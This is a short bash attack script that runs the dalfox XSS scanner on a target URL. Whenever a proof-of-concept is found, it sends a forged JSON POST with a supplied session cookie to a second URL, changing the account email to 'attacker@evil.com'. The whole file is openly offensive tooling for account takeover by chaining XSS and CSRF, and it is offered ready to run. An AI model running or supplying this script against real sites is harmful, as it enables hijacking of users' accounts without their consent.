#!/bin/bash

TARGET_URL="$1"
CSRF_URL="$2"
COOKIE="$3"

if ! command -v dalfox &> /dev/null; then
    echo "[-] dalfox is not installed. Install it from https://github.com/hahwul/dalfox"
    exit 1
fi

echo "[*] Running Dalfox scan on: $TARGET_URL"

# Run dalfox in quick mode
RESULT=$(dalfox url "$TARGET_URL" --only-poc --output raw)

if echo "$RESULT" | grep -q "PoC"; then
    echo "[+] XSS Found!"
    
    echo "$RESULT" | grep "PoC" | while read -r line; do
        echo "[*] Attempting CSRF Chain using reflected XSS PoC"

        curl -s -X POST "$CSRF_URL" \
            -H "Content-Type: application/json" \
            -H "Cookie: $COOKIE" \
            -d '{"email":"attacker@evil.com"}'

        echo "[+] CSRF Attempt Sent"
    done
else
    echo "[-] No XSS found by Dalfox."
fi
